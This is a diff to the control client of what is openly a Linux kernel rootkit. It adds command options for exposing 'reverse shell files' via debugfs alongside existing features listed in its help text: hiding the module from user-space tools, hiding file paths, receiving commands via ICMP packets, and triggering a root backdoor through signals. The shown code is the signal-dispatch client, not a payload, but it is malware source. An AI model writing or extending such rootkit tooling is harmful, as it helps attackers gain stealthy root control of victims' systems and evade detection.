@@ -20,11 +20,13 @@ const char banner[] =
 
 "Module Management:\n"
 "\t" HTM_CMD_DISABLE_CDD     "\t" "Disable character device interface\n"
-"\t" HTM_CMD_DISABLE_DEBUGFS "\t" "Disable exposing internal files via debugfs\n"
+"\t" HTM_CMD_DISABLE_DFS     "\t" "Stop exposing internal files exposed via debugfs\n"
+"\t" HTM_CMD_DISABLE_DFS_RSH "\t" "Stop exposing reverse shell files via debugfs\n"
 "\t" HTM_CMD_DISABLE_FS      "\t" "Disable file system evasion (hiding paths containing \"" HTM_FS_STRING "\")\n"
 "\t" HTM_CMD_DISABLE_NF      "\t" "Disable Netfilter interface (receiving commands via ICMP packets)\n"
 "\t" HTM_CMD_ENABLE_CDD      "\t" "Enable character device interface (receiving commands via /dev/" HTM_CDD_NAME ")\n"
-"\t" HTM_CMD_ENABLE_DEBUGFS  "\t" "Enable exposing internal files via debugfs\n"
+"\t" HTM_CMD_ENABLE_DFS      "\t" "Expose all internal files via debugfs\n"
+"\t" HTM_CMD_ENABLE_DFS_RSH  "\t" "Expose reverse shell files via debugfs\n"
 "\t" HTM_CMD_ENABLE_FS       "\t" "Enable file system evasion\n"
 "\t" HTM_CMD_ENABLE_NF       "\t" "Enable Netfilter interface\n"
 "\t" HTM_CMD_HIDE_MODULE     "\t" "Hide module from user space tools\n"
@@ -90,8 +92,11 @@ int main(int argc, char **argv)
 	if (! strcmp(HTM_CMD_DISABLE_CDD, argv[1]))
 		sig = HTM_SIG_DISABLE_CDD;
 	else
-	if (! strcmp(HTM_CMD_DISABLE_DEBUGFS, argv[1]))
-		sig = HTM_SIG_DISABLE_DEBUGFS;
+	if (! strcmp(HTM_CMD_DISABLE_DFS, argv[1]))
+		sig = HTM_SIG_DISABLE_DFS;
+	else
+	if (! strcmp(HTM_CMD_DISABLE_DFS_RSH, argv[1]))
+		sig = HTM_SIG_DISABLE_DFS_RSH;
 	else
 	if (! strcmp(HTM_CMD_DISABLE_FS, argv[1]))
 		sig = HTM_SIG_DISABLE_FS;
@@ -105,8 +110,11 @@ int main(int argc, char **argv)
 	if (! strcmp(HTM_CMD_ENABLE_CDD, argv[1]))
 		sig = HTM_SIG_ENABLE_CDD;
 	else
-	if (! strcmp(HTM_CMD_ENABLE_DEBUGFS, argv[1]))
-		sig = HTM_SIG_ENABLE_DEBUGFS;
+	if (! strcmp(HTM_CMD_ENABLE_DFS, argv[1]))
+		sig = HTM_SIG_ENABLE_DFS;
+	else
+	if (! strcmp(HTM_CMD_ENABLE_DFS_RSH, argv[1]))
+		sig = HTM_SIG_ENABLE_DFS_RSH;
 	else
 	if (! strcmp(HTM_CMD_ENABLE_FS, argv[1]))
 		sig = HTM_SIG_ENABLE_FS;
@@ -149,11 +157,13 @@ static void _htm_info(void)
 
 		"%u\tTarget PID\n\n"
 		"%u\tDisable character device interface\n"
-		"%u\tDisable exposing internal files via debugfs\n"
+		"%u\tStop exposing internal files exposed via debugfs\n"
+		"%u\tStop exposing reverse shell files via debugfs\n"
 		"%u\tDisable file system evasion (hiding paths containing \"" HTM_FS_STRING "\")\n"
 		"%u\tDisable Netfilter interface (receiving commands via ICMP packets)\n"
 		"%u\tEnable character device interface (receiving commands via /dev/" HTM_CDD_NAME ")\n"
-		"%u\tEnable exposing internal files via debugfs\n"
+		"%u\tExpose all internal files via debugfs\n"
+		"%u\tExpose reverse shell files via debugfs\n"
 		"%u\tEnable file system evasion\n"
 		"%u\tEnable Netfilter interface\n"
 		"%u\tHide module from user space tools\n"
@@ -161,9 +171,10 @@ static void _htm_info(void)
 		"%u\tProbe module status\n"
 		"%u\tTrigger root backdoor\n",
 
-		HTM_PID, HTM_SIG_DISABLE_CDD, HTM_SIG_DISABLE_DEBUGFS, HTM_SIG_DISABLE_FS,
-		HTM_SIG_DISABLE_NF, HTM_SIG_ENABLE_CDD, HTM_SIG_ENABLE_DEBUGFS, HTM_SIG_ENABLE_FS,
-		HTM_SIG_ENABLE_NF, HTM_SIG_HIDE_MODULE, HTM_SIG_SHOW_MODULE, HTM_SIG_STATUS,
+		HTM_PID, HTM_SIG_DISABLE_CDD, HTM_SIG_DISABLE_DFS, HTM_SIG_DISABLE_DFS_RSH,
+		HTM_SIG_DISABLE_FS, HTM_SIG_DISABLE_NF, HTM_SIG_ENABLE_CDD, HTM_SIG_ENABLE_DFS,
+		HTM_SIG_ENABLE_DFS_RSH, HTM_SIG_ENABLE_FS, HTM_SIG_ENABLE_NF, HTM_SIG_HIDE_MODULE,
+		HTM_SIG_SHOW_MODULE, HTM_SIG_STATUS,
 		HTM_SIG_SUDO
 	);
 }
